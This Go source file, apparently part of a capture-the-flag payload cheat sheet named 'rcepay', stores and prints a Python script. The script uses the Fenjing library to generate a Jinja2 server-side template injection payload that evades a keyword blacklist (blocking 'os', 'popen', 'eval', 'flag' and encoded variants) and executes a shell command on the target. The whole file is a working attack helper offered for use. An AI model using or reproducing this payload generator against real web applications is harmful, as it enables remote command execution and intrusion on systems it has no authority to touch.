package rcepay

import "fmt"

var ssticode string = `
项目url:https://github.com/Marven11/Fenjing


from fenjing import exec_cmd_payload, config_payload
import logging
logging.basicConfig(level = logging.INFO)

def waf(s: str): # 如果字符串s可以通过waf则返回True, 否则返回False
    blacklist = [
        'class', '__global__', 'os', 'popen', 'cat', 'flag', '__init__', 'eval', 'exec', 'bases',"\\x6f\\x73","\\u006f\\u0073","\\157\\163"  #这里替换为过滤的内容
    ]
    return all(word not in s for word in blacklist)

if __name__ == "__main__":
    shell_payload, _ = exec_cmd_payload(waf, "ls%20/")  #需要url编码特殊符号
    #config_payload = config_payload(waf)

    print(f"{shell_payload}")
    #print(f"{config_payload}")
	
	`

func FMTSSTI() {
	fmt.Println(ssticode)
}
